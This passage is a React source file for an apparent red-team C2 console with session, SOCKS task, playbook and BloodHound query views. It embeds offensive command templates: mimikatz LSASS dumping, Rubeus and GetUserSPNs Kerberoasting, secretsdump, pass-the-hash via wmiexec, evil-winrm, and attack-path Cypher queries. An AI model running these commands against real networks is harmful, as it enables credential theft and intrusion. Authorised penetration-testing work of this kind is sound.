import { useState, useCallback, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Swords,
  Network,
  Play,
  Square,
  Plus,
  Trash2,
  Terminal,
  Database,
  FileText,
  Search,
  Cpu,
  Lock,
  AlertTriangle,
  CheckCircle2,
  RefreshCw,
  Upload,
  Download,
  Code,
  Layers,
  Radio,
  Eye,
  Zap,
  BarChart3,
  X,
  Shield,
  Globe,
  Link2,
  Crosshair,
  Copy,
  ChevronDown,
  ChevronRight,
  Skull,
  Bug,
  Server,
  Activity,
} from 'lucide-react'
import { useC2Store } from '../../store/c2Store'
import { useLOLStore } from '../../store/lolStore'
import { useRealtimeStore } from '../../store/realtimeStore'
import { useLearningStore } from '../../store/learningStore'
import { useSafetyStore } from '../../store/safetyStore'
import type { C2Framework } from '../../api/c2'

// ---- Types ----

type C2Status = 'connected' | 'disconnected' | 'pending'
type SessionStatus = 'active' | 'dead' | 'sleeping'
type TaskStatus = 'pending' | 'running' | 'completed' | 'failed'
type PlaybookStatus = 'draft' | 'running' | 'completed' | 'paused'
type Severity = 'critical' | 'high' | 'medium' | 'low' | 'info'
type TabId = 'c2' | 'c2-infra' | 'lol-browser' | 'lol-chains' | 'live-dashboard' | 'campaigns' | 'learning' | 'safety' | 'socks' | 'playbooks' | 'neo4j' | 'parsers' | 'search' | 'analysis'

interface C2Server {
  id: string
  name: string
  type: 'mythic' | 'cobalt_strike' | 'sliver' | 'havoc' | 'custom'
  url: string
  status: C2Status
  sessions: number
  listeners: number
  connectedAt?: string
}

interface Session {
  id: string
  hostname: string
  username: string
  os: string
  arch: string
  pid: number
  ip: string
  c2Id: string
  status: SessionStatus
  lastCheckin: string
  integrity: 'high' | 'medium' | 'low'
  tags: string[]
}

interface SocksTask {
  id: string
  name: string
  command: string
  sessionId: string
  proxy: string
  status: TaskStatus
  output: string
  startedAt?: string
  completedAt?: string
}

interface PlaybookStep {
  id: string
  name: string
  command: string
  template?: string
  onSuccess?: string
  onFailure?: string
  timeout?: number
}

interface Playbook {
  id: string
  name: string
  description: string
  steps: PlaybookStep[]
  status: PlaybookStatus
  currentStep?: number
  tags: string[]
}

interface Neo4jQuery {
  id: string
  name: string
  query: string
  description: string
  category: string
}

interface ParsedFile {
  id: string
  filename: string
  type: string
  status: TaskStatus
  findings: number
  size: string
  uploadedAt: string
}

interface Finding {
  id: string
  type: string
  severity: Severity
  title: string
  detail: string
  source: string
  timestamp: string
}
interface LogParser {
  id: string
  name: string
  type: string
  config: Record<string, string>
  enabled: boolean
}

// ---- Initial empty state ----

const BUILTIN_QUERIES: Neo4jQuery[] = [
  {
    id: 'q-1',
    name: 'All Domain Admins',
    query: 'MATCH p=(u:User)-[:MemberOf*1..]->(g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN p',
    description: 'Find all domain admin users including nested group membership',
    category: 'AD Recon',
  },
  {
    id: 'q-2',
    name: 'Kerberoastable Accounts',
    query: 'MATCH (u:User {hasspn: true}) WHERE u.enabled=true RETURN u.name, u.serviceprincipalnames',
    description: 'Find enabled users with SPNs (Kerberoastable)',
    category: 'Credential Attack',
  },
  {
    id: 'q-3',
    name: 'AS-REP Roastable',
    query: 'MATCH (u:User {dontreqpreauth: true, enabled: true}) RETURN u.name',
    description: 'Find accounts not requiring Kerberos pre-authentication',
    category: 'Credential Attack',
  },
  {
    id: 'q-4',
    name: 'Shortest Path to DA',
    query: 'MATCH (u:User {name: "{user}@DOMAIN.LOCAL"}), (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"}), p=shortestPath((u)-[*1..]->(g)) RETURN p',
    description: 'Find shortest attack path from user to Domain Admin',
    category: 'Attack Paths',
  },
  {
    id: 'q-5',
    name: 'Computers with Unconstrained Delegation',
    query: 'MATCH (c:Computer {unconstraineddelegation: true}) WHERE c.enabled=true RETURN c.name',
    description: 'Find computers with unconstrained Kerberos delegation',
    category: 'Privilege Escalation',
  },
  {
    id: 'q-6',
    name: 'Local Admin Rights',
    query: 'MATCH p=(u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name',
    description: 'Find users with local admin rights on computers',
    category: 'Lateral Movement',
  },
]

const PLAYBOOK_TEMPLATES: Playbook[] = [
  {
    id: 'pb-1',
    name: 'Initial Access → Domain Admin',
    description: 'Full attack chain from initial foothold to domain admin',
    status: 'draft',
    tags: ['AD', 'privilege_escalation'],
    steps: [
      { id: 's1', name: 'Enumerate local users', command: 'net user', template: '' },
      { id: 's2', name: 'Check domain info', command: 'nltest /domain_trusts', template: '' },
      { id: 's3', name: 'Run BloodHound ingestor', command: 'SharpHound.exe -c All', template: '' },
      { id: 's4', name: 'Dump LSASS', command: 'mimikatz "sekurlsa::logonpasswords"', template: '' },
    ],
  },
  {
    id: 'pb-2',
    name: 'Kerberoasting Attack Chain',
    description: 'Enumerate SPNs, request tickets, crack offline',
    status: 'draft',
    tags: ['kerberoast', 'credential_access'],
    steps: [
      { id: 's1', name: 'Find Kerberoastable accounts', command: 'GetUserSPNs.py -request', template: '' },
      { id: 's2', name: 'Request service tickets', command: 'Rubeus.exe kerberoast /rc4opsec', template: '' },
      { id: 's3', name: 'Save tickets to file', command: 'echo {output} > tickets.txt', template: '' },
    ],
  },
  {
    id: 'pb-3',
    name: 'Lateral Movement via WMI',
    description: 'Execute commands on remote hosts via WMI',
    status: 'draft',
    tags: ['lateral_movement', 'wmi'],
    steps: [
      { id: 's1', name: 'WMI command execution', command: 'wmic /node:{target} process call create "{cmd}"', template: '{target}' },
      { id: 's2', name: 'Verify execution', command: 'wmic /node:{target} process list brief', template: '' },
    ],
  },
]

// ---- Helper components ----

function StatusBadge({ status }: { status: string }) {
  const colors: Record<string, string> = {
    active: 'bg-green-500/20 text-green-400 border-green-500/30',
    connected: 'bg-green-500/20 text-green-400 border-green-500/30',
    completed: 'bg-green-500/20 text-green-400 border-green-500/30',
    dead: 'bg-red-500/20 text-red-400 border-red-500/30',
    disconnected: 'bg-red-500/20 text-red-400 border-red-500/30',
    failed: 'bg-red-500/20 text-red-400 border-red-500/30',
    sleeping: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30',
    pending: 'bg-blue-500/20 text-blue-400 border-blue-500/30',
    running: 'bg-[#f0c040]/20 text-[#f0c040] border-[#f0c040]/30',
    paused: 'bg-orange-500/20 text-orange-400 border-orange-500/30',
    draft: 'bg-gray-500/20 text-gray-400 border-gray-500/30',
  }
  return (
    <span className={`px-2 py-0.5 rounded-full text-xs font-medium border ${colors[status] ?? 'bg-gray-500/20 text-gray-400 border-gray-500/30'}`}>
      {status}
    </span>
  )
}

function SeverityBadge({ severity }: { severity: Severity }) {
  const colors: Record<Severity, string> = {
    critical: 'bg-red-600/20 text-red-300 border-red-500/30',
    high: 'bg-orange-500/20 text-orange-400 border-orange-500/30',
    medium: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30',
    low: 'bg-blue-500/20 text-blue-400 border-blue-500/30',
    info: 'bg-gray-500/20 text-gray-400 border-gray-500/30',
  }
  return (
    <span className={`px-2 py-0.5 rounded-full text-xs font-medium border uppercase ${colors[severity]}`}>
      {severity}
    </span>
  )
}

function C2TypeIcon({ type }: { type: C2Server['type'] }) {
  const labels: Record<C2Server['type'], string> = {
    mythic: 'MYT', cobalt_strike: 'CS', sliver: 'SLV', havoc: 'HVC', custom: 'CST',
  }
  return (
    <div className="w-8 h-8 rounded bg-red-600/20 border border-red-500/30 flex items-center justify-center">
      <span className="text-red-400 text-xs font-bold font-mono">{labels[type]}</span>
    </div>
  )
}

// ---- Tab components ----

function C2Tab({ servers, sessions, setServers, setSessions }: { servers: C2Server[]; sessions: Session[]; setServers: (s: C2Server[]) => void; setSessions: (s: Session[]) => void }) {
  const [showAddC2, setShowAddC2] = useState(false)
  const [selectedSession, setSelectedSession] = useState<Session | null>(null)
  const [newC2, setNewC2] = useState({ name: '', type: 'mythic' as C2Server['type'], url: '', apiKey: '' })

  const handleAddC2 = () => {
    const server: C2Server = {
      id: `c2-${Date.now()}`,
      name: newC2.name,
      type: newC2.type,
      url: newC2.url,
      status: 'pending',
      sessions: 0,
      listeners: 0,
    }
    setServers([...servers, server])
    setShowAddC2(false)
    setNewC2({ name: '', type: 'mythic', url: '', apiKey: '' })
  }

  const handleRemoveSession = (id: string) => {
    setSessions(sessions.filter(s => s.id !== id))
    if (selectedSession?.id === id) setSelectedSession(null)
  }

  return (
    <div className="grid grid-cols-1 xl:grid-cols-2 gap-6">
      {/* C2 Servers */}
      <div className="bg-surface rounded-xl border border-border p-4">
        <div className="flex items-center justify-between mb-4">
          <h3 className="font-semibold flex items-center gap-2">
            <Radio className="w-4 h-4 text-red-400" />
            C2 Servers
          </h3>
          <button
            onClick={() => setShowAddC2(true)}
            className="flex items-center gap-1.5 px-3 py-1.5 bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 rounded-lg text-sm transition-colors"
          >
            <Plus className="w-3.5 h-3.5" />
            Add C2
          </button>
        </div>

        <div className="space-y-3">
          {servers.map(s => (
            <div key={s.id} className="bg-surface-light rounded-lg p-3 border border-border">
              <div className="flex items-center gap-3">
                <C2TypeIcon type={s.type} />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="font-medium text-sm truncate">{s.name}</span>
                    <StatusBadge status={s.status} />
                  </div>
                  <span className="text-text-secondary text-xs font-mono truncate block">{s.url}</span>
                </div>
                <div className="text-right text-xs text-text-secondary">
                  <div>{s.sessions} sessions</div>
                  <div>{s.listeners} listeners</div>
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* Add C2 Modal */}
        <AnimatePresence>
          {showAddC2 && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center"
              onClick={() => setShowAddC2(false)}
            >
              <motion.div
                initial={{ scale: 0.95, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.95, opacity: 0 }}
                className="bg-surface border border-border rounded-xl p-6 w-full max-w-md"
                onClick={e => e.stopPropagation()}
              >
                <h3 className="font-semibold text-lg mb-4">Add C2 Server</h3>
                <div className="space-y-4">
                  <div>
                    <label className="text-sm text-text-secondary block mb-1">Name</label>
                    <input
                      value={newC2.name}
                      onChange={(e) => setNewC2({ ...newC2, name: e.target.value })}
                      className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm"
                      placeholder="My Mythic Server"
                    />
                  </div>
                  <div>
                    <label className="text-sm text-text-secondary block mb-1">Type</label>
                    <select
                      value={newC2.type}
                      onChange={(e) => setNewC2({ ...newC2, type: e.target.value as C2Server['type'] })}
                      className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm"
                    >
                      <option value="mythic">Mythic</option>
                      <option value="cobalt_strike">Cobalt Strike</option>
                      <option value="sliver">Sliver</option>
                      <option value="havoc">Havoc</option>
                      <option value="custom">Custom</option>
                    </select>
                  </div>
                  <div>
                    <label className="text-sm text-text-secondary block mb-1">URL</label>
                    <input
                      value={newC2.url}
                      onChange={(e) => setNewC2({ ...newC2, url: e.target.value })}
                      className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm font-mono"
                      placeholder="https://c2.internal:7443"
                    />
                  </div>
                  <div>
                    <label className="text-sm text-text-secondary block mb-1">API Key / Token</label>
                    <input
                      type="password"
                      value={newC2.apiKey}
                      onChange={(e) => setNewC2({ ...newC2, apiKey: e.target.value })}
                      className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm"
                      placeholder="••••••••"
                    />
                  </div>
                </div>
                <div className="flex gap-3 mt-6">
                  <button onClick={() => setShowAddC2(false)} className="flex-1 py-2 bg-surface-light border border-border rounded-lg text-sm hover:bg-surface transition-colors">
                    Cancel
                  </button>
                  <button
                    onClick={handleAddC2}
                    disabled={!newC2.name || !newC2.url}
                    className="flex-1 py-2 bg-red-600 hover:bg-red-500 disabled:opacity-50 text-white rounded-lg text-sm transition-colors"
                  >
                    Connect
                  </button>
                </div>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Active Sessions */}
      <div className="bg-surface rounded-xl border border-border p-4">
        <div className="flex items-center justify-between mb-4">
          <h3 className="font-semibold flex items-center gap-2">
            <Terminal className="w-4 h-4 text-green-400" />
            Active Sessions
          </h3>
          <span className="text-xs text-text-secondary">{sessions.length} total</span>
        </div>

        <div className="space-y-2">
          {sessions.map(sess => (
            <motion.div
              key={sess.id}
              whileHover={{ scale: 1.005 }}
              className={`bg-surface-light rounded-lg p-3 border cursor-pointer transition-colors ${
                selectedSession?.id === sess.id ? 'border-red-500/50' : 'border-border hover:border-border-hover'
              }`}
              onClick={() => setSelectedSession(selectedSession?.id === sess.id ? null : sess)}
            >
              <div className="flex items-center gap-3">
                <div className={`w-2 h-2 rounded-full flex-shrink-0 ${
                  sess.status === 'active' ? 'bg-green-400 animate-pulse' : 'bg-gray-400'
                }`} />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="font-mono text-sm font-medium">{sess.hostname}</span>
                    <span className="text-text-secondary text-xs">({sess.username})</span>
                    {sess.integrity === 'high' && (
                      <span className="text-xs bg-yellow-500/20 text-yellow-400 px-1.5 py-0.5 rounded">SYSTEM</span>
                    )}
                  </div>
                  <div className="flex items-center gap-3 mt-1 text-xs text-text-secondary">
                    <span>{sess.os}</span>
                    <span>•</span>
                    <span className="font-mono">{sess.ip}</span>
                    <span>•</span>
                    <span>PID {sess.pid}</span>
                  </div>
                </div>
                <div className="flex flex-col items-end gap-1">
                  <StatusBadge status={sess.status} />
                  <span className="text-xs text-text-secondary">
                    {Math.round((Date.now() - new Date(sess.lastCheckin).getTime()) / 1000)}s ago
                  </span>
                </div>
              </div>

              {/* Expanded session actions */}
              <AnimatePresence>
                {selectedSession?.id === sess.id && (
                  <motion.div
                    initial={{ height: 0, opacity: 0 }}
                    animate={{ height: 'auto', opacity: 1 }}
                    exit={{ height: 0, opacity: 0 }}
                    className="overflow-hidden"
                  >
                    <div className="mt-3 pt-3 border-t border-border flex gap-2 flex-wrap">
                      <button className="flex items-center gap-1.5 px-3 py-1.5 bg-[#f0c040]/10 text-[#f0c040] border border-[#f0c040]/30 rounded-lg text-xs hover:bg-[#f0c040]/20 transition-colors">
                        <Terminal className="w-3 h-3" />
                        Shell
                      </button>
                      <button className="flex items-center gap-1.5 px-3 py-1.5 bg-surface border border-border rounded-lg text-xs hover:bg-surface-light transition-colors">
                        <Upload className="w-3 h-3" />
                        Upload
                      </button>
                      <button className="flex items-center gap-1.5 px-3 py-1.5 bg-surface border border-border rounded-lg text-xs hover:bg-surface-light transition-colors">
                        <Download className="w-3 h-3" />
                        Download
                      </button>
                      <button className="flex items-center gap-1.5 px-3 py-1.5 bg-surface border border-border rounded-lg text-xs hover:bg-surface-light transition-colors">
                        <Cpu className="w-3 h-3" />
                        Inject
                      </button>
                      <button className="flex items-center gap-1.5 px-3 py-1.5 bg-surface border border-border rounded-lg text-xs hover:bg-surface-light transition-colors">
                        <Eye className="w-3 h-3" />
                        SOCKS
                      </button>
                      <button
                        onClick={() => handleRemoveSession(sess.id)}
                        className="flex items-center gap-1.5 px-3 py-1.5 bg-red-600/20 text-red-400 border border-red-500/30 rounded-lg text-xs hover:bg-red-600/30 transition-colors"
                      >
                        <Square className="w-3 h-3" />
                        Kill
                      </button>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </motion.div>
          ))}
        </div>
      </div>
    </div>
  )
}

function SocksTasksTab({ sessions, tasks, setTasks }: { sessions: Session[]; tasks: SocksTask[]; setTasks: React.Dispatch<React.SetStateAction<SocksTask[]>> }) {
  const [showNew, setShowNew] = useState(false)
  const [form, setForm] = useState({ name: '', command: '', sessionId: sessions[0]?.id ?? '', proxy: '' })
  const { createTask } = useC2Store()
  const [submitting, setSubmitting] = useState(false)

  const addTask = async () => {
    const localTask: SocksTask = {
      id: `task-${Date.now()}`,
      ...form,
      status: 'pending',
      output: '',
    }
    setTasks([...tasks, localTask])
    setShowNew(false)
    setSubmitting(true)

    try {
      // Submit to backend C2 task API
      await createTask({
        implantId: form.sessionId,
        command: form.command,
        args: JSON.stringify({ name: form.name, proxy: form.proxy }),
      })
      // Mark as running — backend handles actual execution
      setTasks(prev => prev.map(x => x.id === localTask.id ? { ...x, status: 'running' as const, startedAt: new Date().toISOString() } : x))
    } catch (err) {
      const msg = err instanceof Error ? err.message : 'Failed to submit task'
      setTasks(prev => prev.map(x => x.id === localTask.id ? { ...x, status: 'failed' as const, output: `[!] Error: ${msg}` } : x))
    } finally {
      setSubmitting(false)
    }
  }

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div>
          <h3 className="font-semibold">SOCKS Task Execution</h3>
          <p className="text-sm text-text-secondary mt-0.5">Run security tools through SOCKS proxies via active sessions</p>
        </div>
        <button
          onClick={() => setShowNew(true)}
          className="flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-500 text-white rounded-lg text-sm transition-colors"
        >
          <Plus className="w-4 h-4" />
          New Task
        </button>
      </div>

      {/* Quick commands */}
      <div className="bg-surface rounded-xl border border-border p-4">
        <h4 className="text-sm font-medium mb-3 text-text-secondary">Quick Commands</h4>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
          {[
            { name: 'Nmap via SOCKS', cmd: 'proxychains nmap -sT -Pn {target}' },
            { name: 'SMB Enum', cmd: 'proxychains enum4linux -a {target}' },
            { name: 'Kerberoast', cmd: 'proxychains GetUserSPNs.py {domain}/{user}:{pass}@{dc}' },
            { name: 'BloodHound', cmd: 'proxychains bloodhound-python -d {domain} -u {user} -p {pass}' },
            { name: 'Secretsdump', cmd: 'proxychains secretsdump.py {domain}/{user}:{pass}@{target}' },
            { name: 'WinRM Shell', cmd: 'proxychains evil-winrm -i {target} -u {user} -p {pass}' },
            { name: 'LDAP Dump', cmd: 'proxychains ldapdomaindump {dc} -u {domain}\\{user} -p {pass}' },
            { name: 'Pass-the-Hash', cmd: 'proxychains wmiexec.py -hashes :{hash} {domain}/{user}@{target}' },
          ].map(q => (
            <button
              key={q.name}
              onClick={() => {
                setForm(f => ({ ...f, name: q.name, command: q.cmd }))
                setShowNew(true)
              }}
              className="text-left p-2 bg-surface-light hover:bg-surface-lighter border border-border rounded-lg text-xs transition-colors"
            >
              <div className="font-medium text-text-primary">{q.name}</div>
              <div className="text-text-secondary font-mono mt-0.5 truncate">{q.cmd.substring(0, 35)}…</div>
            </button>
          ))}
        </div>
      </div>

      {/* Task list */}
      {tasks.length === 0 && !showNew && (
        <div className="text-center py-12 text-text-secondary">
          <Network className="w-10 h-10 mx-auto mb-3 opacity-30" />
          <p>No SOCKS tasks yet. Create one to run tools via proxy.</p>
        </div>
      )}

      <div className="space-y-3">
        {tasks.map(t => (
          <div key={t.id} className="bg-surface rounded-xl border border-border p-4">
            <div className="flex items-center justify-between mb-2">
              <div className="flex items-center gap-3">
                <span className="font-medium">{t.name}</span>
                <StatusBadge status={t.status} />
              </div>
              <button
                onClick={() => setTasks(tasks.filter((x: SocksTask) => x.id !== t.id))}
                className="p-1.5 text-text-secondary hover:text-red-400 rounded transition-colors"
              >
                <Trash2 className="w-4 h-4" />
              </button>
            </div>
            <div className="font-mono text-xs text-text-secondary bg-surface-light rounded-lg p-2 mb-2">{t.command}</div>
            <div className="flex gap-4 text-xs text-text-secondary">
              <span>Session: {sessions.find(s => s.id === t.sessionId)?.hostname ?? t.sessionId}</span>
              <span>Proxy: {t.proxy}</span>
            </div>
            {t.output && (
              <pre className="mt-3 text-xs font-mono text-green-400 bg-black/40 rounded-lg p-3 whitespace-pre-wrap">{t.output}</pre>
            )}
          </div>
        ))}
      </div>

      {/* New task modal */}
      <AnimatePresence>
        {showNew && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center"
            onClick={() => setShowNew(false)}
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="bg-surface border border-border rounded-xl p-6 w-full max-w-lg"
              onClick={e => e.stopPropagation()}
            >
              <h3 className="font-semibold text-lg mb-4">New SOCKS Task</h3>
              <div className="space-y-4">
                <div>
                  <label className="text-sm text-text-secondary block mb-1">Task Name</label>
                  <input
                    className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm"
                    placeholder="Nmap scan via proxy"
                    value={form.name}
                    onChange={e => setForm(f => ({ ...f, name: e.target.value }))}
                  />
                </div>
                <div>
                  <label className="text-sm text-text-secondary block mb-1">Session (SOCKS source)</label>
                  <select
                    className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm"
                    value={form.sessionId}
                    onChange={e => setForm(f => ({ ...f, sessionId: e.target.value }))}
                  >
                    {sessions.map(s => (
                      <option key={s.id} value={s.id}>{s.hostname} ({s.ip})</option>
                    ))}
                  </select>
                </div>
                <div>
                  <label className="text-sm text-text-secondary block mb-1">SOCKS Proxy</label>
                  <input
                    className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm font-mono"
                    value={form.proxy}
                    onChange={e => setForm(f => ({ ...f, proxy: e.target.value }))}
                  />
                </div>
                <div>
                  <label className="text-sm text-text-secondary block mb-1">Command</label>
                  <textarea
                    rows={3}
                    className="w-full bg-surface-light border border-border rounded-lg px-3 py-2 text-sm font-mono resize-none"
                    placeholder="proxychains nmap -sT -Pn -p 80,443,445 192.168.1.0/24"
                    value={form.command}
                    onChange={e => setForm(f => ({ ...f, command: e.target.value }))}
                  />
                </div>
              </div>
              <div className="flex gap-3 mt-6">
                <button onClick={() => setShowNew(false)} className="flex-1 py-2 bg-surface-light border border-border rounded-lg text-sm hover:bg-surface transition-colors">
                  Cancel
                </button>
                <button onClick={addTask} disabled={submitting} className="flex-1 py-2 bg-red-600 hover:bg-red-500 disabled:opacity-50 disabled:cursor-not-allowed text-white rounded-lg text-sm transition-colors flex items-center justify-center gap-2">
                  <Play className="w-4 h-4" />
                  {submitting ? 'Submitting...' : 'Run Task'}
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}

function PlaybooksTab({ playbooks, setPlaybooks }: { playbooks: Playbook[]; setPlaybooks: (p: Playbook[]) => void }) {
  const [selected, setSelected] = useState<Playbook | null>(null)
  const [expandedSteps, setExpandedSteps] = useState<Set<string>>(new Set())

  const runPlaybook = (id: string) => {
    const runningPlaybooks = playbooks.map(p => p.id === id ? { ...p, status: 'running' as const, currentStep: 0 } : p)
    setPlaybooks(runningPlaybooks)
    // Simulate step execution
    let step = 0
    const interval = setInterval(() => {
      step++
      const updatedPlaybooks = runningPlaybooks.map(p => {
        if (p.id !== id) return p
        if (step >= p.steps.length) {
          clearInterval(interval)
          return { ...p, status: 'completed' as const, currentStep: p.steps.length }
        }
        return { ...p, currentStep: step }
      })
      setPlaybooks(updatedPlaybooks)
      if (step >= (playbooks.find(p => p.id === id)?.steps.length ?? 0)) clearInterval(interval)
    }, 2000)
  }

  return (
    <div className="grid grid-cols-1 xl:grid-cols-2 gap-6">
      {/* Playbook list */}
      <div className="bg-surface rounded-xl border border-border p-4">
        <div className="flex items-center justify-between mb-4">
          <h3 className="font-semibold flex items-center gap-2">
            <Layers className="w-4 h-4 text-[#f0c040]" />
            Playbooks
          </h3>
          <button className="flex items-center gap-1.5 px-3 py-1.5 bg-[#f0c040]/10 hover:bg-[#f0c040]/20 text-[#f0c040] border border-[#f0c040]/30 rounded-lg text-sm transition-colors">
            <Plus className="w-3.5 h-3.5" />
            New
          </button>
        </div>

        <div className="space-y-3">
          {playbooks.map(pb => (
            <div
              key={pb.id}
              className={`bg-surface-light rounded-lg p-3 border cursor-pointer transition-colors ${
                selected?.id === pb.id ? 'border-[#f0c040]/50' : 'border-border hover:border-border-hover'
              }`}
              onClick={() => setSelected(selected?.id === pb.id ? null : pb)}
            >
              <div className="flex items-start justify-between gap-2">
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="font-medium text-sm">{pb.name}</span>
                    <StatusBadge status={pb.status} />
                  </div>
                  <p className="text-xs text-text-secondary mt-0.5">{pb.description}</p>
                  <div className="flex gap-1.5 mt-2 flex-wrap">
                    {pb.tags.map(t => (
                      <span key={t} className="text-xs bg-surface border border-border px-2 py-0.5 rounded">{t}</span>
                    ))}
                  </div>
                </div>
                <div className="text-xs text-text-secondary">{pb.steps.length} steps</div>
              </div>

              {/* Progress bar if running */}
              {pb.status === 'running' && (
                <div className="mt-3">
                  <div className="flex justify-between text-xs text-text-secondary mb-1">
                    <span>Step {(pb.currentStep ?? 0) + 1} / {pb.steps.length}</span>
                    <span>{Math.round(((pb.currentStep ?? 0) / pb.steps.length) * 100)}%</span>
                  </div>
                  <div className="h-1.5 bg-surface rounded-full overflow-hidden">
                    <motion.div
                      className="h-full bg-[#f0c040] rounded-full"
                      initial={{ width: 0 }}
                      animate={{ width: `${((pb.currentStep ?? 0) / pb.steps.length) * 100}%` }}
                      transition={{ duration: 0.5 }}
                    />
                  </div>
                </div>
              )}

              <div className="flex gap-2 mt-3">
                {pb.status === 'draft' && (
                  <button
                    onClick={e => { e.stopPropagation(); runPlaybook(pb.id) }}
                    className="flex items-center gap-1.5 px-3 py-1.5 bg-green-600/20 text-green-400 border border-green-500/30 rounded text-xs hover:bg-green-600/30 transition-colors"
                  >
                    <Play className="w-3 h-3" />
                    Run
                  </button>
                )}
                {pb.status === 'running' && (
                  <button
                    onClick={e => { e.stopPropagation(); setPlaybooks(playbooks.map((p: Playbook) => p.id === pb.id ? { ...p, status: 'paused' } : p)) }}
                    className="flex items-center gap-1.5 px-3 py-1.5 bg-yellow-600/20 text-yellow-400 border border-yellow-500/30 rounded text-xs hover:bg-yellow-600/30 transition-colors"
                  >
                    <Square className="w-3 h-3" />
                    Pause
                  </button>
                )}
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Step detail */}
      <div className="bg-surface rounded-xl border border-border p-4">
        {selected ? (
          <>
            <h3 className="font-semibold mb-4">{selected.name} — Steps</h3>
            <div className="space-y-2">
              {selected.steps.map((step, idx) => {
                const pb = playbooks.find(p => p.id === selected.id)
                const isActive = pb?.status === 'running' && pb.currentStep === idx
                const isDone = (pb?.currentStep ?? -1) > idx || pb?.status === 'completed'
                return (
                  <div
                    key={step.id}
                    className={`rounded-lg border p-3 transition-colors ${
                      isActive ? 'border-[#f0c040]/50 bg-[#f0c040]/5' :
                      isDone ? 'border-green-500/30 bg-green-600/5' :
                      'border-border bg-surface-light'
                    }`}
                  >
                    <div className="flex items-center gap-3">
                      <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold flex-shrink-0 ${
                        isDone ? 'bg-green-500/20 text-green-400' :
                        isActive ? 'bg-[#f0c040]/20 text-[#f0c040]' :
                        'bg-surface text-text-secondary'
                      }`}>
                        {isDone ? <CheckCircle2 className="w-3.5 h-3.5" /> : isActive ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : idx + 1}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="font-medium text-sm">{step.name}</div>
                        <div className="font-mono text-xs text-text-secondary truncate mt-0.5">{step.command}</div>
                      </div>
                    </div>
                  </div>
                )
              })}
            </div>
          </>
        ) : (
          <div className="h-full flex items-center justify-center text-text-secondary">
            <div className="text-center">
              <Layers className="w-10 h-10 mx-auto mb-3 opacity-30" />
              <p className="text-sm">Select a playbook to view steps</p>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

function Neo4jTab() {
  const [queries] = useState<Neo4jQuery[]>(BUILTIN_QUERIES)
  const [selected, setSelected] = useState<Neo4jQuery | null>(null)
  const [customQuery, setCustomQuery] = useState('')
  const [results, setResults] = useState<string>('')
  const [running, setRunning] = useState(false)
  const [activeCategory, setActiveCategory] = useState('All')

  const categories = ['All', ...Array.from(new Set(queries.map(q => q.category)))]

  const filtered = activeCategory === 'All' ? queries : queries.filter(q => q.category === activeCategory)

  const runQuery = useCallback((q: string) => {
    setRunning(true)
    setResults('')
    setTimeout(() => {
      setResults(`// Query results for: ${q.substring(0, 60)}...\n\n{\n  "nodes": [],\n  "relationships": [],\n  "stats": {\n    "nodes_created": 0,\n    "relationships_created": 0,\n    "properties_set": 0\n  },\n  "message": "Connected to Neo4j — run query to see results"\n}`)
      setRunning(false)
    }, 1500)
  }, [])

  return (
    <div className="grid grid-cols-1 xl:grid-cols-2 gap-6">
      {/* Query library */}
      <div className="bg-surface rounded-xl border border-border p-4">
        <div className="flex items-center justify-between mb-4">
          <h3 className="font-semibold flex items-center gap-2">
            <Database className="w-4 h-4 text-[#f0c040]" />
            Neo4j Query Library
          </h3>
        </div>

        {/* Category filter */}
        <div className="flex gap-2 mb-4 flex-wrap">
          {categories.map(c => (
            <button
              key={c}
              onClick={() => setActiveCategory(c)}
              className={`px-3 py-1 rounded-lg text-xs transition-colors ${
                activeCategory === c
                  ? 'bg-[#f0c040]/10 text-[#f0c040] border border-[#f0c040]/30'
                  : 'bg-surface-light text-text-secondary border border-border hover:text-text-primary'
              }`}
            >
              {c}
            </button>
          ))}
        </div>

        <div className="space-y-2">
          {filtered.map(q => (
            <div
              key={q.id}
              className={`bg-surface-light rounded-lg p-3 border cursor-pointer transition-colors ${
                selected?.id === q.id ? 'border-[#f0c040]/50' : 'border-border hover:border-border-hover'
              }`}
              onClick={() => { setSelected(q); setCustomQuery(q.query) }}
            >
              <div className="flex items-start justify-between gap-2">
                <div>
